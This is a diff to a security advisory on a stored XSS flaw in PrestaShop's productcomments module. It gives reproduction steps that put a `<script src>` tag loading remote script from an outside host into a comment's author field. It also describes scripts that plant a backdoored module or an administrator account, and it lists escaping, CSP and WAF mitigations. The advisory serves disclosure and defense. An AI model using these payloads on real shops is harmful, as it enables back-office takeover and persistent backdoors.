@@ -51,16 +51,15 @@ From then on, it is possible to inject malicious JavaScript, for example: `<scri
 Touchweb provides two benign JavaScript scripts that highlight the vulnerability for PrestaShop 1.7+ (we tested for 1.7.7.8).
 * Script A allows injecting a blockwishlist module containing a backdoor without the knowledge of a moderator, i.e. an administrator with rights.
 * Script B allows injecting an administrator in the specific case where it is disabled.
-
 DO NOT TEST IT IN PRODUCTION.
 
 
-### How to reproduce?
+### How to reproduce?
 
 * We installed PrestaShop 1.7.7.8.
 * We installed the [productcomments module zip](https://github.com/PrestaShop/productcomments/releases/download/v5.0.1/productcomments.zip).
 * (Optional) To facilitate adding comments without a customer account, we activated the anonymous comments option.
-* Enter `<script src="//1j.vc/ps_a.js">` or `<script src="//1j.vc/ps_a.js">`  as "author" and complete the other fields.
+* Enter `<script src="//1j.vc/ps_a.js">` or `<script src="//1j.vc/ps_b.js">` as "author" and complete the other fields.
 * Return to the back office on the module configuration page.
 
 
@@ -69,8 +68,8 @@ DO NOT TEST IT IN PRODUCTION.
 In the face of a Stored XSS vulnerability targeting the back office, it is impossible to undo all the effects. However, the most dangerous exploits can be limited.
 
 * Systematically escape characters ' " < and > by replacing them with HTML entities and applying strip_tags - Smarty and Twig provide auto-escape filters: 
--- Smarty: {$value.comment|escape:'html':'UTF-8'}
--- Twig: {{$value.comment|e}}
+** Smarty: `{$value.comment|escape:'html':'UTF-8'}`
+** Twig: `{{ value.comment|e }}`
 * Configure CSP headers (content security policies) by listing  externals domains allowed to load assets (such as js files).
 * If applicable: check against all your frontoffice's uploaders, uploading files which will be served by your server with mime type application/javascript (like every .js natively) must be strictly forbidden as it must be considered as dangerous as PHP files.
 * Activate OWASP 941's rules on your WAF (Web application firewall) - be warn that you will probably break your backoffice and you will need to preconfigure some bypasses against these set of rules.
@@ -83,6 +82,3 @@ You must check every tables within your database which could store guest's input
 You can find a list of potential hijacked events on [PrestaShop method Validate::isCleanHtml()](https://github.com/PrestaShop/PrestaShop/blob/develop/classes/Validate.php#L507)
 
 Be warn that you will probably face falses positives alerts which can be time consumming.
-
-
-
